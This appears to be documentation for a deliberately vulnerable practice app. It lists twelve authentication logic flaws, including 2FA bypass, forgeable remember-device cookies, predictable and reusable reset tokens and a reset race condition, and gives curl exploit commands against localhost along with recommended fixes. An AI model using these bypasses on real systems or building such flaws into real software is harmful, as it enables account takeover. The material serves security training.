# Authentication Business Logic Flaws - Documentation

> [!CAUTION]
> **CRITICAL SECURITY VULNERABILITIES** - For educational/testing purposes only. Never use in production.

## Overview

Implemented **12 authentication business logic vulnerabilities** based on real HackerOne reports.

---

## 2FA Bypass Vulnerabilities

### 1. Response Manipulation (`/auth/verify-otp-bypass`)

**Vulnerability**: Returns 200 status with `verified: false` for wrong OTP. Attacker intercepts and changes to `verified: true`.

**Exploit**:
```bash
# 1. Request OTP
curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# 2. Try wrong OTP
curl -X POST http://localhost:3000/api/auth/verify-otp-bypass \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","otp":"0000"}'

# Response: {"verified": false, "token": null}
# Attacker intercepts and changes to: {"verified": true, "token": "fake_jwt"}
```

---

### 2. Direct Endpoint Access (`/auth/dashboard-data`)

**Vulnerability**: Protected endpoints only check JWT, not if 2FA was completed.

**Exploit**:
```bash
# 1. Login with password only (skip OTP)
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password123"}' \
  | jq -r '.token')

# 2. Access protected endpoint without completing 2FA
curl -X GET http://localhost:3000/api/auth/dashboard-data \
  -H "Authorization: Bearer $TOKEN"
# SUCCESS - 2FA bypassed!
```

---

### 3. Remember Device Bypass (`/auth/remember-device`)

**Vulnerability**: Cookie is just `base64(userId)` - can be forged for any user.

**Exploit**:
```bash
# Forge cookie for any user
USER_ID="target-user-id-here"
COOKIE=$(echo -n "$USER_ID" | base64)

curl -X GET http://localhost:3000/api/auth/check-remembered \
  -H "Cookie: remember_2fa=$COOKIE"
# Returns: {"remembered": true, "userId": "target-user-id-here"}
```

---

## Forgot Password Vulnerabilities

### 4. Weak Token Generation (`/auth/forgot-password-v2`)

**Vulnerability**: Sequential tokens (`RESET-1000`, `RESET-1001`, etc.) are predictable.

**Exploit**:
```bash
# Request token
curl -X POST http://localhost:3000/api/auth/forgot-password-v2 \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Response shows: "exploit": "Next token will be: RESET-1001"
# Attacker can predict and use next token before victim
```

---

### 5. No Token Invalidation (`/auth/reset-password-v2`)

**Vulnerability**: Tokens remain valid after use - can be reused indefinitely.

**Exploit**:
```bash
# 1. Get reset token
TOKEN="RESET-1000"

# 2. Reset password
curl -X POST http://localhost:3000/api/auth/reset-password-v2 \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","token":"'$TOKEN'","newPassword":"hacked123"}'

# 3. Use same token again
curl -X POST http://localhost:3000/api/auth/reset-password-v2 \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","token":"'$TOKEN'","newPassword":"hacked456"}'
# Still works!
```

---

### 6. Multiple Active Tokens

**Vulnerability**: Requesting new tokens doesn't invalidate old ones.

**Exploit**:
```bash
# Request 10 tokens
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/auth/forgot-password-v2 \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com"}'
done

# All 10 tokens remain valid - increases attack surface
```

---

### 7. Race Condition

**Vulnerability**: 100ms delay allows concurrent password resets.

**Exploit**:
```bash
# Send 3 concurrent requests
for i in {1..3}; do
  curl -X POST http://localhost:3000/api/auth/reset-password-v2 \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","token":"RESET-1000","newPassword":"hack'$i'"}' &
done
wait
# Race condition may allow multiple resets
```

---

### 8. No MFA Verification on Reset

**Vulnerability**: Password reset doesn't require 2FA even if enabled.

**Impact**: Attacker can reset password and bypass 2FA entirely.

---

### 9-12. Previously Implemented

- **User Enumeration** - Different responses for existing vs non-existing users
- **OTP Disclosure** - OTP returned in API response
- **Weak OTP** - Only 4 digits
- **No Rate Limiting** - Unlimited attempts
- **OTP Reuse** - Not invalidated after use
- **Infinite Validity** - No expiration
- **Host Header Injection** - Password reset poisoning

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/auth/verify-otp-bypass` | POST | Response manipulation |
| `/auth/dashboard-data` | GET | Direct access bypass |
| `/auth/remember-device` | POST | Forgeable cookie |
| `/auth/check-remembered` | GET | No validation |
| `/auth/forgot-password-v2` | POST | Weak tokens, multiple active |
| `/auth/reset-password-v2` | POST | No invalidation, race condition |

---

## Testing Checklist

- [ ] Response manipulation with browser DevTools
- [ ] Direct endpoint access without 2FA
- [ ] Forge remember device cookie
- [ ] Predict sequential reset tokens
- [ ] Reuse reset token after successful reset
- [ ] Generate multiple active tokens
- [ ] Exploit race condition with concurrent requests
- [ ] Reset password without MFA verification

---

## Secure Implementation

To fix these vulnerabilities:

1. **Response Manipulation**: Return generic messages, use proper HTTP status codes
2. **Direct Access**: Implement session state tracking for 2FA completion
3. **Remember Device**: Use cryptographically secure tokens, validate server-side
4. **Token Generation**: Use `crypto.randomBytes()`, minimum 32 characters
5. **Token Invalidation**: Clear tokens immediately after use
6. **Single Active Token**: Invalidate old tokens when generating new ones
7. **Race Conditions**: Use database transactions with proper locking
8. **MFA on Reset**: Require MFA verification before allowing password reset

---

## References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [HackerOne 2FA Bypass Reports](https://hackerone.com/reports?q=2fa+bypass)
- [Password Reset Vulnerabilities](https://systemweakness.com/password-reset-vulnerabilities)
